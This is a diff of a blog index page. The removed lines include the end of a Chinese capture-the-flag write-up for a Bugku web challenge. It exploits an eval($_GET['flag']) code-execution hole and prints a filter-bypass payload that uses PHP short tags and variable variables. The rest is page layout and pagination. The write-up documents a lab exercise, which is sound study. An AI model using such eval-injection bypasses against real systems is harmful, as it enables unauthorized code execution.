-<p>但容易发现此处存在任意代码执行漏洞， </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[&#39;flag&#39;])</span><br></pre></td></tr></table></figure>
-
-<p>尝试绕过过滤</p>
-<p>echo被过滤了，用php短标签进行输出</p>
-<p>flag被过滤了，用先赋其他值，再修改的方法绕过</p>
-<p>当php开启短标签后，</p>
-<p>能正常解析类似于这样形式的php文件： phpinfo() ?&gt;</p>
-<p>并且可以使用<?=$a?>的形式输出</p>
-<p>$exam字符串长度为49</p>
-<p>为了使payload长度与$exam长度相等，在代码间加入无意义的语句。</p>
-<p>构造payload：$a=blag;$a{0}=f;111111111111111111111;?&gt;<?=$$a;?></p>
-<p>成功得到flag</p>
-<img src="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/5/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/5/">Next &amp;raquo;</a>
     </nav>
   
 
